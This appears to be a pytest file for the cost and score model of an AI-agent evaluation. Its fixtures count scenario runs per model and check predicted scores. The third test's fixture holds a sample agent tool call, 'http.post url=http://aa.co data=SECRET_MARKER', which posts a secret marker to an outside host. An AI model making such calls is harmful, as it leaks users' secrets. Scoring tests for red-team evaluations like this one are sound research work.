from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]


def _load_cost_model():
    path = ROOT / "scripts" / "cost_model.py"
    spec = importlib.util.spec_from_file_location("cost_model", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_single_post_prediction_matches_point_zero_nine() -> None:
    module = _load_cost_model()
    rows = module.build_rows(
        {
            ("gpt_oss", "single"): {
                "prompt": [0],
                "completion": [0],
                "generations": [1],
                "fired": 1,
                "posts": 1,
                "n": 1,
            }
        },
        prefill_override=0.0,
        decode_override=0.0,
        tool_override=0.0,
        overhead_override=1.0,
    )

    assert rows[0]["normalized_per_fired"] == pytest.approx(0.09)
    assert rows[0]["predicted_score"] == pytest.approx(180.0)


def test_multipost_prediction_uses_extra_predicate_instances() -> None:
    module = _load_cost_model()
    rows = module.build_rows(
        {
            ("gpt_oss", "multipost4"): {
                "prompt": [0],
                "completion": [0],
                "generations": [4],
                "fired": 1,
                "posts": 4,
                "n": 1,
            }
        },
        prefill_override=0.0,
        decode_override=0.0,
        tool_override=0.0,
        overhead_override=1.0,
    )

    assert rows[0]["raw_per_fired"] == pytest.approx(66.0)
    assert rows[0]["normalized_per_fired"] == pytest.approx(0.33)
    assert rows[0]["predicted_score"] == pytest.approx(660.0)


def test_private_prediction_discounts_literal_marker_records() -> None:
    module = _load_cost_model()
    rows = module.build_rows(
        {
            ("gpt_oss", "forge"): {
                "prompt": [0],
                "completion": [0],
                "generations": [1],
                "tool_calls": [1],
                "successful_tool_calls": [1],
                "fired": 1,
                "posts": 1,
                "n": 1,
                "records": [
                    {
                        "fired": True,
                        "message": "http.post url=http://aa.co data=SECRET_MARKER",
                        "tool_events": [
                            {
                                "name": "http.post",
                                "ok": True,
                                "data_has_marker": True,
                            }
                        ],
                    }
                ],
            }
        },
        prefill_override=0.0,
        decode_override=0.0,
        tool_override=0.0,
        overhead_override=1.0,
    )

    assert rows[0]["predicted_score"] == pytest.approx(180.0)
    assert rows[0]["private_survival"] == pytest.approx(0.20)
    assert rows[0]["private_predicted_score"] == pytest.approx(36.0)
